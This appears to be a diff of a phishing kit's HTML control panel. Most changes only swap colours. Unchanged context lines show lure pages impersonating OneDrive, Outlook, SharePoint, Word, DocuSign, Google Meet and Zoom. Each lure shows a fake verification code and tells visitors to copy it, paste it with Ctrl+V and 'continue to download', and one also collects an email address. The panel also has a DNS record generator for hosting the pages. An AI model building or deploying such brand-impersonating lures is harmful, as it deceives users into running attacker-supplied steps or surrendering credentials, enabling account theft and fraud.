@@ -7,17 +7,17 @@
     <style>
         /* ================= BASE & VARIABLES ================= */
         :root {
-            --bg-dark: #3C3B6E;
-            --panel-bg: rgba(60, 59, 110, 0.85);
+            --bg-dark: #0A1F44;
+            --panel-bg: rgba(10, 31, 68, 0.85);
             --panel-border: rgba(255, 255, 255, 0.4);
             --text-main: #FFFFFF;
             --text-muted: #D6E4F0;
-            --accent-blue: #3C3B6E;
-            --accent-red: #B22234;
-            --accent-green: #3C3B6E;
+            --accent-blue: #1E3A8A;
+            --accent-red: #001F3F;
+            --accent-green: #1E3A8A;
             --accent-gray: rgba(255,255,255,0.2);
             --input-bg: #FFFFFF;
-            --input-text: #3C3B6E;
+            --input-text: #0A1F44;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
@@ -38,7 +38,7 @@
         /* ================= LAYOUT ================= */
         .sidebar {
             width: 260px;
-            background: linear-gradient(180deg, #3C3B6E 0%, #B22234 100%);
+            background: linear-gradient(180deg, #0A1F44 0%, #001F3F 100%);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
             border-right: 1px solid var(--panel-border);
@@ -54,7 +54,7 @@
         .nav-menu { flex: 1; overflow-y: auto; }
         .nav-item { padding: 12px 20px; display: flex; align-items: center; gap: 12px; color: #D6E4F0; cursor: pointer; font-size: 14px; transition: 0.2s; }
         .nav-item:hover { background-color: rgba(255,255,255,0.2); color: #FFFFFF; }
-        .nav-item.active { background-color: #FFFFFF; color: #3C3B6E; border-radius: 0 20px 20px 0; margin-right: 10px; font-weight: 700; }
+        .nav-item.active { background-color: #FFFFFF; color: #0A1F44; border-radius: 0 20px 20px 0; margin-right: 10px; font-weight: 700; }
         .nav-item svg { width: 18px; height: 18px; fill: currentColor; }
 
         .main-content {
@@ -82,7 +82,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            background: linear-gradient(90deg, #B22234, #FFFFFF, #3C3B6E);
+            background: linear-gradient(90deg, #001F3F, #FFFFFF, #1E3A8A);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
@@ -97,7 +97,7 @@
         .input-group label { font-size: 12px; color: #D6E4F0; font-weight: 600; }
         .input-group input, .input-group select {
             background-color: var(--input-bg);
-            border: 1px solid #B22234;
+            border: 1px solid #001F3F;
             color: var(--input-text);
             padding: 10px 12px;
             border-radius: 4px;
@@ -105,14 +105,14 @@
             outline: none;
             font-weight: 600;
         }
-        .input-group input:focus { border-color: #3C3B6E; box-shadow: 0 0 0 2px rgba(60,59,110,0.3); }
+        .input-group input:focus { border-color: #0A1F44; box-shadow: 0 0 0 2px rgba(10,31,68,0.3); }
         
         .btn { padding: 8px 16px; border: none; border-radius: 4px; font-size: 13px; font-weight: 700; cursor: pointer; color: white; transition: 0.2s; }
-        .btn-blue { background-color: #3C3B6E; border: 1px solid #FFFFFF; }
-        .btn-blue:hover { background-color: #2a2a5a; }
-        .btn-red { background-color: #B22234; }
-        .btn-red:hover { background-color: #8f1b2a; }
-        .btn-green { background-color: #3C3B6E; border: 1px solid #FFFFFF; }
+        .btn-blue { background-color: #1E3A8A; border: 1px solid #FFFFFF; }
+        .btn-blue:hover { background-color: #0A1F44; }
+        .btn-red { background-color: #001F3F; }
+        .btn-red:hover { background-color: #00112B; }
+        .btn-green { background-color: #1E3A8A; border: 1px solid #FFFFFF; }
         .btn-gray { background-color: rgba(255,255,255,0.2); border: 1px solid #FFFFFF; }
         
         .btn-group { display: flex; gap: 10px; justify-content: flex-end; margin-top: 10px; }
@@ -122,8 +122,8 @@
         .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #D6E4F0; transition: .4s; border-radius: 20px; }
-        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: #3C3B6E; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: #B22234; }
+        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: #0A1F44; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #001F3F; }
         input:checked + .slider:before { transform: translateX(14px); background-color: #FFFFFF; }
 
         /* Templates Grid */
@@ -142,15 +142,15 @@
             text-align: center;
             transition: 0.2s;
         }
-        .template-card.active { border-color: #B22234; box-shadow: 0 0 0 1px #B22234; }
+        .template-card.active { border-color: #001F3F; box-shadow: 0 0 0 1px #001F3F; }
         .template-card h4 { font-size: 14px; margin: 0; text-transform: capitalize; color: #FFFFFF; }
         .template-card .status { font-size: 11px; color: #D6E4F0; }
-        .template-card .status.active { color: #B22234; font-weight: bold; }
+        .template-card .status.active { color: #001F3F; font-weight: bold; }
         .template-card .actions { display: flex; gap: 8px; width: 100%; }
         .template-card .actions button { flex: 1; padding: 6px; font-size: 12px; }
         
         .file-upload-wrapper { display: flex; align-items: center; gap: 12px; margin-top: 15px; }
-        .file-upload-btn { background: #FFFFFF; color: #3C3B6E; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: 700; }
+        .file-upload-btn { background: #FFFFFF; color: #0A1F44; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: 700; }
         #file-chosen { color: #D6E4F0; font-size: 13px; }
 
         /* ================= EXTRA URL STORAGE ================= */
@@ -159,7 +159,7 @@
             color: #D6E4F0;
             line-height: 1.6;
             background: rgba(255,255,255,0.08);
-            border-left: 3px solid #B22234;
+            border-left: 3px solid #001F3F;
             border-radius: 4px;
             padding: 10px 14px;
             margin-bottom: 18px;
@@ -180,19 +180,19 @@
             transition: 0.2s;
         }
         .extra-row:hover { border-color: rgba(255,255,255,0.6); }
-        .extra-row.filled { border-color: #B22234; background: rgba(178,34,52,0.14); }
+        .extra-row.filled { border-color: #001F3F; background: rgba(0,31,63,0.18); }
         .extra-index {
             width: 22px; height: 22px; flex-shrink: 0;
             border-radius: 50%;
-            background: #B22234;
+            background: #001F3F;
             color: #FFFFFF;
             font-size: 11px; font-weight: 700;
             display: flex; align-items: center; justify-content: center;
         }
         .extra-row input {
             background: #FFFFFF;
-            border: 1px solid #B22234;
-            color: #3C3B6E;
+            border: 1px solid #001F3F;
+            color: #0A1F44;
             border-radius: 4px;
             padding: 7px 9px;
             font-size: 12px;
@@ -200,7 +200,7 @@
             outline: none;
             min-width: 0;
         }
-        .extra-row input:focus { border-color: #3C3B6E; box-shadow: 0 0 0 2px rgba(60,59,110,0.3); }
+        .extra-row input:focus { border-color: #0A1F44; box-shadow: 0 0 0 2px rgba(10,31,68,0.3); }
         .extra-row input.extra-name { flex: 0 0 92px; }
         .extra-row input.extra-url { flex: 1 1 auto; }
         .extra-actions { display: flex; gap: 4px; flex-shrink: 0; }
@@ -211,12 +211,12 @@
             color: #FFFFFF; font-size: 12px; font-weight: 700;
             transition: 0.2s;
         }
-        .extra-open { background: #3C3B6E; border: 1px solid #FFFFFF; }
-        .extra-open:hover { background: #2a2a5a; }
+        .extra-open { background: #1E3A8A; border: 1px solid #FFFFFF; }
+        .extra-open:hover { background: #0A1F44; }
         .extra-copy { background: rgba(255,255,255,0.25); border: 1px solid #FFFFFF; }
         .extra-copy:hover { background: rgba(255,255,255,0.4); }
-        .extra-clear { background: #B22234; }
-        .extra-clear:hover { background: #8f1b2a; }
+        .extra-clear { background: #001F3F; }
+        .extra-clear:hover { background: #00112B; }
 
         .extra-footer {
             display: flex; align-items: center; justify-content: space-between;
@@ -232,14 +232,14 @@
         /* ================= TEMPLATE STYLES (Generic) ================= */
         .tpl-body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f3f3; display: flex; flex-direction: column; height: 100vh; align-items: center; justify-content: center; }
         .tpl-card { background: white; width: 100%; max-width: 420px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); padding: 32px; text-align: center; box-sizing: border-box; }
-        .tpl-code-box { background-color: #3C3B6E; border-radius: 6px; padding: 24px; color: white; margin-bottom: 24px; }
+        .tpl-code-box { background-color: #0A1F44; border-radius: 6px; padding: 24px; color: white; margin-bottom: 24px; }
         .tpl-code-box-label { font-size: 11px; letter-spacing: 1px; text-transform: uppercase; opacity: 0.8; margin-bottom: 8px; }
         .tpl-code-display { font-size: 28px; font-weight: bold; letter-spacing: 4px; margin-bottom: 16px; font-family: monospace; }
         .tpl-copy-btn { background-color: rgba(255,255,255,0.2); border: none; color: white; padding: 8px 16px; border-radius: 4px; font-size: 13px; cursor: pointer; }
         .tpl-instructions { text-align: left; list-style: none; padding: 0; margin: 0 0 24px 0; font-size: 13px; color: #333; }
         .tpl-instructions li { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
-        .tpl-step-num { background-color: #B22234; color: white; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; flex-shrink: 0; }
-        .tpl-primary-btn { background-color: #3C3B6E; color: white; border: none; width: 100%; padding: 14px; border-radius: 4px; font-size: 15px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; }
+        .tpl-step-num { background-color: #001F3F; color: white; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; flex-shrink: 0; }
+        .tpl-primary-btn { background-color: #0A1F44; color: white; border: none; width: 100%; padding: 14px; border-radius: 4px; font-size: 15px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; }
         .tpl-ms-logo { width: 48px; height: 48px; margin: 0 auto 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 2px; }
         .tpl-ms-logo div { background: #f25022; }
         .tpl-ms-logo div:nth-child(2) { background: #7fba00; }
@@ -248,11 +248,11 @@
 
         /* Outlook Specific */
         .outlook-body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; height: 100vh; display: flex; flex-direction: column; }
-        .outlook-header { background-color: #3C3B6E; color: white; height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; }
+        .outlook-header { background-color: #0A1F44; color: white; height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; }
         .outlook-main { display: flex; flex: 1; overflow: hidden; }
         .outlook-sidebar { width: 320px; border-right: 1px solid #e1e1e1; background-color: #f8f9fa; overflow-y: auto; }
         .outlook-email-item { padding: 16px; border-bottom: 1px solid #e1e1e1; display: flex; gap: 12px; }
-        .outlook-avatar { width: 32px; height: 32px; border-radius: 50%; background-color: #dbeafe; color: #3C3B6E; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .outlook-avatar { width: 32px; height: 32px; border-radius: 50%; background-color: #dbeafe; color: #0A1F44; display: flex; align-items: center; justify-content: center; font-weight: bold; }
         .outlook-content { flex: 1; padding: 32px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .outlook-card { background: #f8f9fa; border-radius: 12px; padding: 40px; text-align: center; max-width: 480px; width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
 
@@ -260,7 +260,7 @@
         .toggle-group input[type="checkbox"] {
             width: 16px;
             height: 16px;
-            accent-color: #B22234;
+            accent-color: #001F3F;
             cursor: pointer;
         }
 
@@ -269,9 +269,9 @@
         .dns-table th { text-align: left; padding: 8px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #D6E4F0; border-bottom: 1px solid rgba(255,255,255,0.4); }
         .dns-table td { padding: 10px 8px; border-bottom: 1px solid rgba(255,255,255,0.2); color: #FFFFFF; }
         .dns-table tr:last-child td { border-bottom: none; }
-        .dns-chip { display: inline-block; background: #B22234; color: #FFFFFF; border-radius: 3px; padding: 2px 7px; font-weight: 700; font-size: 11px; letter-spacing: 0.5px; }
+        .dns-chip { display: inline-block; background: #001F3F; color: #FFFFFF; border-radius: 3px; padding: 2px 7px; font-weight: 700; font-size: 11px; letter-spacing: 0.5px; }
         .dns-mono { font-family: monospace; font-size: 13px; color: #FFFFFF; }
-        .dns-pre { background: rgba(60, 59, 110, 0.9); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.4); border-radius: 6px; padding: 14px; font-family: monospace; font-size: 12px; color: #FFFFFF; white-space: pre; overflow-x: auto; margin-top: 12px; }
+        .dns-pre { background: rgba(10, 31, 68, 0.9); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.4); border-radius: 6px; padding: 14px; font-family: monospace; font-size: 12px; color: #FFFFFF; white-space: pre; overflow-x: auto; margin-top: 12px; }
     </style>
 </head>
 <body>
@@ -506,7 +506,7 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px;">Microsoft OneDrive</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Verify to access this file</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to access and download your secure files from OneDrive.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">DV9QR4BMG</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
@@ -516,7 +516,7 @@
                         <li><span class="tpl-step-num">2</span> Click the button below and continue with code</li>
                         <li><span class="tpl-step-num">3</span> Paste the code to verify your identity</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -529,17 +529,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 5px;">Important Update.pdf</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Verify your identity</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">To access this document, please complete verification with Microsoft.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">GDNSCLLP4</div>
-                        <button class="tpl-copy-btn" style="background-color: #B22234;" onclick="copyCode(this)">Copy Code</button>
+                        <button class="tpl-copy-btn" style="background-color: #001F3F;" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #B22234;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #B22234;">2</span> Click continue and paste (Ctrl+V)</li>
-                        <li><span class="tpl-step-num" style="background-color: #B22234;">3</span> Paste the code to verify your identity</li>
+                        <li><span class="tpl-step-num" style="background-color: #001F3F;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #001F3F;">2</span> Click continue and paste (Ctrl+V)</li>
+                        <li><span class="tpl-step-num" style="background-color: #001F3F;">3</span> Paste the code to verify your identity</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -552,17 +552,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 5px;">DocuSign</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Review & Sign Document</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to review and sign this document.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">CDZU3XHSU</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify your identity</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -575,20 +575,20 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px;">Microsoft</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Sign in to your account</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Enter your credentials to access your secure workspace.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">MSFT7391</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify your identity</li>
                     </ul>
                     <div class="input-group" style="margin-bottom: 15px;">
                         <input type="email" placeholder="Email, phone, or Skype" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
                     </div>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -602,7 +602,7 @@
                 </div>
                 <div class="outlook-main">
                     <div class="outlook-sidebar">
-                        <div class="outlook-email-item" style="background: white; border-left: 4px solid #3C3B6E;">
+                        <div class="outlook-email-item" style="background: white; border-left: 4px solid #0A1F44;">
                             <div class="outlook-avatar">M</div>
                             <div style="flex: 1;">
                                 <div style="display: flex; justify-content: space-between; font-size: 13px; font-weight: 600;">
@@ -621,17 +621,17 @@
                             </div>
                             <h3 style="margin: 0 0 12px; font-size: 20px; color: #242424;">Encrypted Message</h3>
                             <p style="margin: 0 0 24px; font-size: 14px; color: #555;">This email is protected with Microsoft Entra ID. Please verify your identity to view the content.</p>
-                            <div class="tpl-code-box" style="background-color: #3C3B6E; max-width: 320px; margin: 0 auto 24px;">
+                            <div class="tpl-code-box" style="background-color: #0A1F44; max-width: 320px; margin: 0 auto 24px;">
                                 <div class="tpl-code-box-label">Your Verification Code</div>
                                 <div class="tpl-code-display">OTP4821</div>
                                 <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                             </div>
                             <ul class="tpl-instructions" style="max-width: 320px; margin: 0 auto 24px;">
-                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click continue and paste the code</li>
-                                <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to unlock the message</li>
+                                <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                                <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click continue and paste the code</li>
+                                <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to unlock the message</li>
                             </ul>
-                            <button class="tpl-primary-btn" style="background-color: #3C3B6E; width: auto; padding: 12px 24px; margin: 0 auto;" onclick="simulateRedirect()">Continue to Download</button>
+                            <button class="tpl-primary-btn" style="background-color: #0A1F44; width: auto; padding: 12px 24px; margin: 0 auto;" onclick="simulateRedirect()">Continue to Download</button>
                         </div>
                     </div>
                 </div>
@@ -646,17 +646,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 5px;">Google Meet</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Join a Meeting</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to join this secure Google Meet session.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">GMEET123</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify and join the meeting</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify and join the meeting</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -669,17 +669,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 5px;">Zoom Meeting</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Join Zoom Meeting</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to join this secure Zoom meeting.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">882 1234 5678</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify and join the meeting</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify and join the meeting</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -692,17 +692,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px;">Microsoft SharePoint</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Access Shared File</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to access this shared SharePoint document.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">SPO98765</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify your identity</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -715,17 +715,17 @@
                     <div style="font-weight: 600; font-size: 14px; margin-bottom: 5px;">Microsoft Word</div>
                     <h1 style="font-size: 20px; margin: 10px 0 5px;">Open Document</h1>
                     <p style="font-size: 13px; color: #666; margin: 0 0 20px;">Please verify your identity to open this secure Word document.</p>
-                    <div class="tpl-code-box" style="background-color: #3C3B6E;">
+                    <div class="tpl-code-box" style="background-color: #0A1F44;">
                         <div class="tpl-code-box-label">Your Verification Code</div>
                         <div class="tpl-code-display">WORD2024</div>
                         <button class="tpl-copy-btn" onclick="copyCode(this)">Copy Code</button>
                     </div>
                     <ul class="tpl-instructions">
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">1</span> Copy the verification code above</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">2</span> Click the button below and continue with code</li>
-                        <li><span class="tpl-step-num" style="background-color: #3C3B6E;">3</span> Paste the code to verify your identity</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">1</span> Copy the verification code above</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">2</span> Click the button below and continue with code</li>
+                        <li><span class="tpl-step-num" style="background-color: #0A1F44;">3</span> Paste the code to verify your identity</li>
                     </ul>
-                    <button class="tpl-primary-btn" style="background-color: #3C3B6E;" onclick="simulateRedirect()">Continue to Download</button>
+                    <button class="tpl-primary-btn" style="background-color: #0A1F44;" onclick="simulateRedirect()">Continue to Download</button>
                 </div>
             </div>
         </div>
@@ -1220,7 +1220,7 @@
             document.getElementById('dns-output').innerHTML = `
                 <div style="font-size: 13px; color: #D6E4F0; margin-bottom: 12px; line-height: 1.6;">
                     Generated records for <strong style="color: #FFFFFF;">${data.domain}</strong>.
-                    Replace <span class="dns-mono" style="color: #B22234;">${data.placeholder}</span>
+                    Replace <span class="dns-mono" style="color: #001F3F;">${data.placeholder}</span>
                     with your real hosting address, then add each row in
                     <strong style="color: #FFFFFF;">Cloudflare → ${data.domain} → DNS → Records → Add record</strong>.
                 </div>
